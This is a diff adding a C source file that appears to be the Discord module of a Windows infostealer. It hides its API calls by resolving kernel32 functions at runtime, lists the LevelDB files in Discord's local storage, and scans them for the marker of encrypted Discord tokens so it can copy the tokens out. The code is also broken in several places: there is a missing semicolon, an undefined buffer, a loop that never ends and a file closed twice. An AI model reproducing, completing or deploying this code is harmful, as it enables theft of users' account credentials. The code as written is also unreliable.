@@ -1,0 +1,109 @@
+#include <stdio.h>
+#include <windows.h>
+#include "../../include/utils.h"
+#define MAX_LINE_LENGTH 256
+
+void ExtractToken(const char *levelDB) {
+
+    char line[MAX_LINE_LENGTH];
+    int token_index
+
+    FILE *leveldbFile = fopen(levelDB, "r");
+
+    if (leveldbFile == NULL) {
+        printf("Error opening LevelDB File: %s", levelDB);
+        return;
+    }
+     // Read the entire file in to a buffer
+        fseek(leveldbFile, 0, SEEK_END);
+        long leveldbSize = ftell(leveldbFile);
+        fseek(leveldbFile, 0, SEEK_SET);
+
+        //
+        char *leveldbContents = (char *)malloc(leveldbSize + 1);
+        fread(leveldbContents, 1, leveldbSize, leveldbFile);
+        leveldbContents[leveldbSize] = '\0';
+        fclose(leveldbFile);
+
+        while((token_index = FindSubstring(leveldbContents, leveldbSize, "dQw4w9WgXcQ")) != -1) {
+            int i =0;
+            char *token = calloc(1, 1024);
+            while (tmp_file_contents[token_index] != '"') {
+                token[i] = tmp_file_contents[token_index];
+                token_index++;
+                i++;
+            }
+            
+
+        }
+
+
+    fclose(leveldbFile);
+}
+
+void HarvestDiscord() {
+    printf("[o] Running Discord Module\n");
+
+    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
+
+    if(hKernel32 == NULL) {
+        printf("[-] Failed to load kernel32 [Discord Module].\n");
+        printf("Error: %u\n",GetLastError());
+
+    }
+
+    typedef DWORD (WINAPI *ENVIRON)(LPCSTR,LPSTR,DWORD);
+    ENVIRON pGetEnvironmentVariable = (ENVIRON)GetProcAddress(hKernel32, "GetEnvironmentVariableA");
+
+    typedef HANDLE (WINAPI *FIRSTFILE)(LPCSTR, LPWIN32_FIND_DATAA);
+    FIRSTFILE pFindFirstFile = (FIRSTFILE)GetProcAddress(hKernel32, "FindFirstFileA");
+
+    typedef BOOL (WINAPI *FINDNEXT)(HANDLE, LPWIN32_FIND_DATAA);
+    FINDNEXT pFindNextFile = (FINDNEXT)GetProcAddress(hKernel32, "FindNextFileA");
+
+    typedef BOOL (WINAPI *FINDCLOSE)(HANDLE);
+    FINDCLOSE pFindClose = (FINDCLOSE)GetProcAddress(hKernel32, "FindClose");
+    
+    
+    WIN32_FIND_DATA fileData;
+    HANDLE findHandle = INVALID_HANDLE_VALUE;
+    DWORD dwError=0;
+    
+    // APPDATA Path.
+    char Appdata[MAX_PATH] = {0};
+    ULONG AppdataSize = sizeof(Appdata);
+    pGetEnvironmentVariable("APPDATA", Appdata, AppdataSize);
+    
+    // Discord Path.
+    char discordPath[MAX_PATH] = {0};
+    char filePath[MAX_PATH] = {0};
+    
+    snprintf(discordPath, sizeof(discordPath), "%s%s", Appdata, "\\Discord\\Local Storage\\leveldb\\");
+    
+    strcat(discordPath, "*");
+    
+    findHandle = pFindFirstFile(discordPath,  &fileData);
+
+    if(INVALID_HANDLE_VALUE == findHandle) {
+        printf("Error with file handle: %s [Discord.]", GetLastError());
+    }
+    discordPath[strcspn(discordPath, "*")] = '\0';
+    do {
+        if((strstr(fileData.cFileName, ".ldb") != NULL) | (strstr(fileData.cFileName, ".log") != NULL)) {
+            snprintf(filePath, sizeof(filePath), "%s%s", discordPath, fileData.cFileName);
+            // printf("[File]: %s\n", filePath);
+            ExtractToken(filePath);
+        } else {
+            continue;
+        }
+
+    } while(pFindNextFile(findHandle, &fileData) != 0);
+
+    if(GetLastError() == ERROR_NO_MORE_FILES) {
+        printf("No more files: %s [Discord.]\n", GetLastError());
+    }
+
+    pFindClose(findHandle);
+}
+
+
